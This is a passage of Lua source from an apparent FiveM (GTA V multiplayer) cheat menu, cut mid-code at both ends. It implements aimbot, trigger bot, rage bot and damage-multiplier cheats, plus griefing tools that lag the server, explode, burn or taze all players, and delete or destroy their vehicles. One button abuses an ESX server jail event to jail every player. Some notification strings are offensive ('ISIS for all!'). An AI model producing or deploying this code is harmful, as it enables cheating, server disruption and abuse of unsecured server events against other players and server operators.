                           if ADRVSDD.Config.Player.OneTap then
                               ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 100.0)
                           end
       
                           local destination = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
                           local origin = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
                           local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 1.0)
       
                           if self.Config.ShowText then
                               self:Draw3DText(where.x, where.y, where.z, "*RAGED*", 255, 55, 70, 255)
                           end
       
                           ADRVSDD:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")()), ADRVSDD:GetFunction("PlayerPedId")(), true, false, 24000.0)
       
                           if ADRVSDD.Config.Player.OneTap then
                               ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 1.0)
                           end
                       end
                   end
               end
           end
       
           function ADRVSDD:_no_bullet_drop()
               if IsDisabledControlPressed(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing and (not ADRVSDD.FreeCam.On and not ADRVSDD.RCCar.CamOn) then
                   local curWep = ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")())
                   local cur = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetCurrentPedWeaponEntityIndex")(ADRVSDD:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
                   local _dir = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
                   local dir = rot_to_dir(_dir)
                   local dist = 99999.9
                   local len = _multiply(dir, dist)
                   local targ = cur + len
                   ADRVSDD:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, ADRVSDD:GetFunction("PlayerPedId")(), true, true, 24000.0)
                   ADRVSDD:GetFunction("SetPedShootsAtCoord")(ADRVSDD:GetFunction("PlayerPedId")(), targ.x, targ.y, targ.z, true)
               end
           end
       
           function ADRVSDD:_trigger_bot()
               local found, ent, _seat = _get_ped_hovered_over()
       
               if found and ADRVSDD:GetFunction("DoesEntityExist")(ent) and ADRVSDD:GetFunction("IsEntityAPed")(ent) and not ADRVSDD:IsFriend(ent) and ADRVSDD:GetFunction("IsPedWeaponReadyToShoot")(ADRVSDD:GetFunction("PlayerPedId")()) and (not ADRVSDD.Config.Player.OnlyTargetPlayers or _is_ped_player(ent)) and (not ADRVSDD.Config.Player.TriggerBotNeedsLOS or ADRVSDD:GetFunction("HasEntityClearLosToEntityInFront")(ADRVSDD:GetFunction("PlayerPedId")(), ent)) then
                   local _bone, _dist, _name = _get_closest_bone(ent, _seat)
       
                   -- SKEL_HEAD
                   if _seat ~= nil then
                       _bone = 31086
                   end
       
                   if _bone and not ADRVSDD:GetFunction("IsPedDeadOrDying")(ent) then
                       if ADRVSDD.Config.Player.OneTap then
                           ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 100.0)
                       end
       
                       local _pos = ADRVSDD:GetFunction("GetPedBoneCoords")(ent, _bone, 0.0, 0.0, 0.0)
                       local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 1.0)
                       self:Draw3DText(where.x, where.y, where.z + 0.2, "*TRIGGER BOT SHOOTING*", 255, 0, 0, 255)
                       ADRVSDD:GetFunction("SetPedShootsAtCoord")(ADRVSDD:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)
       
                       if ADRVSDD.Config.Player.OneTap then
                           ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 1.0)
                       end
                   end
               end
           end
       
           function ADRVSDD:_aimbot()
               SetCamAffectsAiming(GetRenderingCam(), false)
               local _ped = _get_ped_in_aimbot_fov()
       
               if self.Config.Player.AimbotTarget and (not ADRVSDD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) or ADRVSDD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget)) then
                   self.Config.Player.AimbotTarget = nil
               end
       
               if self.Config.Player.AimbotTarget and ADRVSDD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not ADRVSDD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
                   _ped = self.Config.Player.AimbotTarget
               end
       
       
               if ADRVSDD:GetFunction("DoesEntityExist")(_ped) and not ADRVSDD:GetFunction("IsPedDeadOrDying")(_ped) then
                   if not self.Config.Player.AimbotTarget then
                       self.Config.Player.AimbotTarget = _ped
                   end
       
                   local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
                   local _pos = ADRVSDD:GetFunction("GetPedBoneCoords")(_ped, bone_check[self.Config.Player.AimbotBone][1], 0.0, 0.0, 0.0)
       
                   if self.Config.ShowText then
                       self:Draw3DText(where.x, where.y, where.z, "*AIMBOT LOCKED*", 255, 0, 0, 255)
                   end
       
                   ADRVSDD:GetFunction("DisableControlAction", 0, ADRVSDD.Keys[self.Config.Player.AimbotKey], true)
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys[self.Config.Player.AimbotKey]) then
                       if ADRVSDD.Config.Player.OneTap then
                           ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 9999.9)
                       end
       
                       ADRVSDD:GetFunction("SetPedShootsAtCoord")(ADRVSDD:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)
                       local _on_screen, sx, sy = ADRVSDD:GetFunction("GetScreenCoordFromWorldCoord")(_pos.x, _pos.y, _pos.z)
                       ADRVSDD:GetFunction("SetCursorLocation")(sx, sy)
       
                       if ADRVSDD.Config.Player.OneTap then
                           ADRVSDD:GetFunction("SetPlayerWeaponDamageModifier")(ADRVSDD:GetFunction("PlayerId")(), 1.0)
                       end
                   end
               end
           end
       
           function ADRVSDD:_tp_aimbot()
               local them = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Config.Player.AimbotTarget, 0.0, 0.0, 0.0)
               local us = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
               local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(them.x, them.y, them.z, us.x, us.y, us.z)
       
               if dist > self.Config.Player.TPAimbotThreshold then
                   local fwd = ADRVSDD:GetFunction("GetEntityForwardVector")(self.Config.Player.AimbotTarget)
                   local spot = them + (fwd * -self.Config.Player.TPAimbotDistance)
                   ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), spot.x, spot.y, spot.z - 1.0)
                   local rot = ADRVSDD:GetFunction("GetEntityRotation")(self.Config.Player.AimbotTarget)
                   ADRVSDD:GetFunction("SetEntityRotation")(ADRVSDD:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z, 0, true)
               end
           end
       
           function ADRVSDD:DoAimbot()
               if not self.Config.Player.AimbotFOV or not self._ScrW or not self._ScrH then return end
               self:DoAimbotPoly()
       
               if self.Config.Player.AimbotDrawFOV then
                   self:DrawAimbotFOV()
               end
       
               if not ADRVSDD:GetFunction("IsPlayerFreeAiming")(ADRVSDD:GetFunction("PlayerId")()) and not ADRVSDD:GetFunction("IsPedDoingDriveby")(ADRVSDD:GetFunction("PlayerPedId")()) then
                   self.Config.Player.AimbotTarget = nil
       
                   return
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys[self.Config.Player.AimbotReleaseKey]) then
                   self.Config.Player.AimbotTarget = nil
               end
       
               if self.Config.Player.RageBot then
                   self:_rage_bot()
               end
       
               if self.Config.Player.TriggerBot then
                   self:_trigger_bot()
               end
       
               if self.Config.Player.NoDrop then
                   self:_no_bullet_drop()
               end
       
               if self.Config.Player.Aimbot then
                   self:_aimbot()
               end
       
               if self.Config.Player.TPAimbot and self.Config.Player.Aimbot and self.Config.Player.AimbotTarget and ADRVSDD:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not ADRVSDD:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
                   self:_tp_aimbot()
               end
           end
       
           CreateThread(function()
               while ADRVSDD.Enabled do
                   Wait(0)
                   ADRVSDD:DoAimbot()
               end
           end)
       
           ADRVSDD:AddCategory("Model", function(self, x, y)
               local curY = 0
       
               if self.Painter:Button("RANDOM COMPONENTS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "skin_random") then
                   CreateThread(function()
                       ADRVSDD:SetPedModel("mp_m_freemode_01")
                       ADRVSDD:GetFunction("SetPedRandomComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       ADRVSDD:GetFunction("SetPedRandomProps")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                   end)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("MP GREEN ALIEN", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "alien_green") then
                   CreateThread(function()
                       ADRVSDD:SetPedModel("mp_m_freemode_01")
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 1, 134, 8)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 2, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 3, 13, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 4, 106, 8)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 5, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 6, 6, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 7, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 8, 15, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 11, 274, 8)
                   end)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("MP PURPLE ALIEN", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "alien_purple") then
                   CreateThread(function()
                       ADRVSDD:SetPedModel("mp_m_freemode_01")
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 1, 134, 9)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 2, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 3, 13, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 4, 106, 9)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 5, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 6, 6, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 7, 0, 0)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 8, 15, 1)
                       ADRVSDD:GetFunction("SetPedComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), 11, 274, 9)
                   end)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("COVID-19 PED", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
                   CreateThread(function()
                       ADRVSDD:SetPedModel("g_m_m_chemwork_01")
                   end)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("CUSTOM MODEL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "custom_model") then
                   CreateThread(function()
                       local mdl = ADRVSDD:GetTextInput("Enter model name.", "", 50)
       
                       if not mdl or mdl == "" then
                           ADRVSDD:AddNotification("INFO", "Cancelled.", 5000)
                       else
                           ADRVSDD:SetPedModel(mdl)
                       end
                   end)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("RESET PLAYER MODEL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ped_reset") then
                   CreateThread(function()
                       ADRVSDD:SetPedModel("mp_m_freemode_01")
                       ADRVSDD:GetFunction("SetPedRandomComponentVariation")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       ADRVSDD:GetFunction("SetPedRandomProps")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                   end)
               end
       
               curY = curY + 25
           end)
       
           local function _has_value(tab, val)
               for key, value in dict.pairs(tab) do
                   if value == val then return true end
               end
       
               return false
           end
       
           local function _find_weapon(str)
               if _has_value(all_weapons, str) then return str end
       
               for _, wep in dict.ipairs(all_weapons) do
                   if wep:lower():find(str:lower()) then return wep end
               end
       
               return false
           end
       
           ADRVSDD:AddCategory("Weapon", function(self, x, y)
               local curY = 0
       
               if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_all_weapons") then
                   for _, wep in dict.ipairs(all_weapons) do
                       ADRVSDD:GetFunction("GiveWeaponToPed")(ADRVSDD:GetFunction("PlayerPedId")(), ADRVSDD:GetFunction("GetHashKey")(wep), 500, false, true)
                   end
       
                   ADRVSDD:AddNotification("SUCCESS", "Weapons given!", 10000)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("GIVE SPECIFIC", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_specific_weapon") then
                   local name = ADRVSDD:GetTextInput("Enter weapon name", "", 30)
       
                   if name then
                       local wep = _find_weapon(name)
                       if not wep then return ADRVSDD:AddNotification("ERROR", "Invalid weapon.", 5000) end
                       ADRVSDD:GetFunction("GiveWeaponToPed")(ADRVSDD:GetFunction("PlayerPedId")(), ADRVSDD:GetFunction("GetHashKey")(wep), 500, false, true)
                       ADRVSDD:AddNotification("SUCCESS", "Weapon given!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_self_all_weapons") then
                   for _, wep in dict.ipairs(all_weapons) do
                       ADRVSDD:GetFunction("RemoveWeaponFromPed")(ADRVSDD:GetFunction("PlayerPedId")(), ADRVSDD:GetFunction("GetHashKey")(wep), 500, false, true)
                   end
       
                   ADRVSDD:AddNotification("SUCCESS", "Weapons removed!", 10000)
               end
       
               curY = curY + 25
           end)
       
           local boost_options = {"1.0", "2.0", "4.0", "8.0", "16.0", "32.0", "64.0", "128.0", "256.0", "512.0"}
       
           ADRVSDD:AddCategory("Vehicle", function(self, x, y)
               local curY = 5
       
               if self.Painter:CheckBox("VEHICLE GOD MODE", self.Config.Vehicle.GodMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_god_mode") then
                   self.Config.Vehicle.GodMode = not self.Config.Vehicle.GodMode
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("BULLET PROOF TIRES", self.Config.Vehicle.BulletProofTires, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "bulletproof_enabled") then
                   self.Config.Vehicle.BulletProofTires = not self.Config.Vehicle.BulletProofTires
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 20
       
               if self.Painter:Button("DELETE VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_self_vehicle") then
                   local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                   if not ADRVSDD:GetFunction("DoesEntityExist")(veh) then
                       ADRVSDD:AddNotification("ERROR", "You must be in a vehicle to use this!")
                   else
                       ADRVSDD.Util:DeleteEntity(veh)
                       ADRVSDD:AddNotification("SUCCESS", "Vehicle deleted!", 10000)
                   end
               end
       
               curY = curY + 20
       
               if self.Painter:Button("SPAWN VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "spawn_self_vehicle") then
                   local modelName = ADRVSDD:GetTextInput("Enter vehicle spawn name", "", 20)
       
                   if modelName ~= "" and ADRVSDD:GetFunction("IsModelValid")(modelName) and ADRVSDD:GetFunction("IsModelAVehicle")(modelName) then
                       ADRVSDD:SpawnLocalVehicle(modelName)
                       ADRVSDD:AddNotification("SUCCESS", "Spawned vehicle " .. modelName, 10000)
                   else
                       ADRVSDD:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("REPAIR VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "repair_vehicle") then
                   local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                   if not ADRVSDD:GetFunction("DoesEntityExist")(veh) then return ADRVSDD:AddNotification("ERROR", "You must be in a vehicle to use this!") end
                   ADRVSDD:RepairVehicle(veh)
                   ADRVSDD:AddNotification("SUCCESS", "Vehicle repaired!", 10000)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("MAX VEHICLE OUT", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "max_out_vehicle") then
                   local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                   ADRVSDD:GetFunction("SetVehicleModKit")(veh, 0)
                   ADRVSDD:GetFunction("SetVehicleMod")(veh, 11, ADRVSDD:GetFunction("GetNumVehicleMods")(veh, 11) - 1, false)
                   ADRVSDD:GetFunction("SetVehicleMod")(veh, 12, ADRVSDD:GetFunction("GetNumVehicleMods")(veh, 12) - 1, false)
                   ADRVSDD:GetFunction("SetVehicleMod")(veh, 13, ADRVSDD:GetFunction("GetNumVehicleMods")(veh, 13) - 1, false)
                   ADRVSDD:GetFunction("SetVehicleMod")(veh, 15, ADRVSDD:GetFunction("GetNumVehicleMods")(veh, 15) - 2, false)
                   ADRVSDD:GetFunction("SetVehicleMod")(veh, 16, ADRVSDD:GetFunction("GetNumVehicleMods")(veh, 16) - 1, false)
                   ADRVSDD:GetFunction("ToggleVehicleMod")(veh, 17, true)
                   ADRVSDD:GetFunction("ToggleVehicleMod")(veh, 18, true)
                   ADRVSDD:GetFunction("ToggleVehicleMod")(veh, 19, true)
                   ADRVSDD:GetFunction("ToggleVehicleMod")(veh, 21, true)
                   ADRVSDD:AddNotification("SUCCESS", "Vehicle maxed out.", 10000)
               end
       
               curY = curY + 25
       
               if self.Painter:ListChoice("VEHICLE ENGINE BOOST: ", boost_options, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_boost") then
                   self.Config.Vehicle.Boost = dict.tonumber(boost_options[list_choices["vehicle_boost"].selected])
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("UNLOCK CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "unlock_closest_vehicle") then
                   local closestVeh = ADRVSDD:GetClosestVehicle()
                   if not ADRVSDD:GetFunction("DoesEntityExist")(closestVeh) then return ADRVSDD:AddNotification("ERROR", "No vehicle!") end
                   ADRVSDD:AddNotification("INFO", "Unlocking vehicle.", 5000)
                   ADRVSDD:UnlockVehicle(closestVeh)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("DISABLE CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "disable_closest_vehicle") then
                   local closestVeh = ADRVSDD:GetClosestVehicle()
                   if not ADRVSDD:GetFunction("DoesEntityExist")(closestVeh) then return ADRVSDD:AddNotification("ERROR", "No vehicle!") end
                   ADRVSDD:DisableVehicle(closestVeh)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("DELETE CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_closest_vehicle") then
                   local closestVeh = ADRVSDD:GetClosestVehicle()
                   if not ADRVSDD:GetFunction("DoesEntityExist")(closestVeh) then return ADRVSDD:AddNotification("ERROR", "No vehicle!") end
                   ADRVSDD.Util:DeleteEntity(closestVeh)
               end
           end)
       
           ADRVSDD:AddCategory("Online", function(self, x, y)
               local curY = 5
       
               if self.Painter:CheckBox("INCLUDE SELF", ADRVSDD.Config.OnlineIncludeSelf, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "online_include_self") then
                   ADRVSDD.Config.OnlineIncludeSelf = not ADRVSDD.Config.OnlineIncludeSelf
                   ADRVSDD.ConfigClass.Save(true)
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("LAG SERVER", _use_lag_server, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "lag_server_out") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_lag_server = not _use_lag_server
                       ADRVSDD:LaggingServer()
       
                       if _use_lag_server then
                           ADRVSDD:AddNotification("INFO", "Lagging server!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped lagger.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("HYDRANT LOOP", _use_hydrant_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "hydrant_loop_all") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_hydrant_loop = not _use_hydrant_loop
                       ADRVSDD:HydrantLoop()
       
                       if _use_hydrant_loop then
                           ADRVSDD:AddNotification("INFO", "Water for all!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped water.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("FIRE LOOP", _use_fire_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fire_loop_all") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_fire_loop = not _use_fire_loop
                       ADRVSDD:FireLoop()
       
                       if _use_fire_loop then
                           ADRVSDD:AddNotification("INFO", "Fire for all!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped fire.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("TAZE LOOP", _use_taze_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "taze_loop_all") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_taze_loop = not _use_taze_loop
                       ADRVSDD:TazeLoop()
       
                       if _use_taze_loop then
                           ADRVSDD:AddNotification("INFO", "Tazing for all!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped tazing.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("DELETE VEHICLES LOOP", _use_delete_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles_loop") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_delete_loop = not _use_delete_loop
                       ADRVSDD:DeleteLoop()
       
                       if _use_delete_loop then
                           ADRVSDD:AddNotification("INFO", "No more cars!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped deleting.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("EXPLODE VEHICLES LOOP", _use_explode_vehicle_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_vehicles_loop") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_explode_vehicle_loop = not _use_explode_vehicle_loop
                       ADRVSDD:ExplodeVehicleLoop()
       
                       if _use_explode_vehicle_loop then
                           ADRVSDD:AddNotification("INFO", "Crisp cars for all!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped exploding.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("EXPLODE PLAYERS LOOP", _use_explode_player_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_player_loop") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_explode_player_loop = not _use_explode_player_loop
                       ADRVSDD:ExplodePlayerLoop()
       
                       if _use_explode_player_loop then
                           ADRVSDD:AddNotification("INFO", "ISIS for all!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped exploding.", 10000)
                       end
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:CheckBox("LAUNCH VEHICLE LOOP", _use_launch_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "_use_launch_loop") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       _use_launch_loop = not _use_launch_loop
                       ADRVSDD:LaunchLoop()
       
                       if _use_launch_loop then
                           ADRVSDD:AddNotification("INFO", "Time to go to space!", 10000)
                       else
                           ADRVSDD:AddNotification("INFO", "Stopped launching.", 10000)
                       end
                   end
               end
       
               curY = curY + 20
       
               if self.DynamicTriggersasdf["esx-qalle-jail"] and self.DynamicTriggersasdf["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"] then
                   if self.Painter:Button("JAIL ALL ~g~ESX ~w~(SHIFT FOR REASON)", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "jail_all_bitches") then
                       CreateThread(function()
                           local reason = "^3#FalloutMenu"
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               local _msg = ADRVSDD:GetTextInput("Enter jail reason.", reason, 200)
       
                               if _msg then
                                   reason = _msg
                               end
                           end
       
                           for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   local _id = dict.tonumber(ADRVSDD:GetFunction("GetPlayerServerId")(src))
                                   ADRVSDD:GetFunction("TriggerServerEvent")(self.DynamicTriggersasdf["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, dict.math.random(500, 5000), reason)
                               end
                           end
       
                           ADRVSDD:AddNotification("INFO", "All players jailed!", 10000)
                       end)
                   end
       
                   curY = curY + 25
               end
       
               if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_everyones_weapons") then
                   CreateThread(function()
                       for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                               for _, wep in dict.pairs(all_weapons) do
                                   ADRVSDD:GetFunction("RemoveWeaponFromPed")(ped, ADRVSDD:GetFunction("GetHashKey")(wep), 9000, false, true)
                               end
                           end
                       end
                   end)
       
                   ADRVSDD:AddNotification("INFO", "Weapons removed!", 10000)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_everyone_weapons") then
                   CreateThread(function()
                       for id, src, wep in dict.pairs(ADRVSDD.PlayerCache, all_weapons) do
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
       
                               for _, wep in dict.pairs(all_weapons) do
                                   ADRVSDD:GetFunction("GiveWeaponToPed")(ped, ADRVSDD:GetFunction("GetHashKey")(wep), 9000, false, true)
                               end
                           end
                       end
                   end)
       
                   ADRVSDD:AddNotification("INFO", "Weapons given!", 10000)
               end
       
               curY = curY + 25
       
               if self.Painter:Button("EXPLODE EVERYONE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_everyone") then
                   if ADRVSDD.Config.SafeMode then
                       ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                   else
                       CreateThread(function()
                           local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                           for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   ADRVSDD:GetFunction("AddExplosion")(ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                               end
                           end
                       end)
       
                       ADRVSDD:AddNotification("INFO", "ISIS Has entered the building!", 10000)
                   end
               end
       
               curY = curY + 25
       
               if self.Painter:Button("TURN ALL CARS INTO RAMPS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ramp_all_cars") then
                   if ADRVSDD.Config.SafeMode then
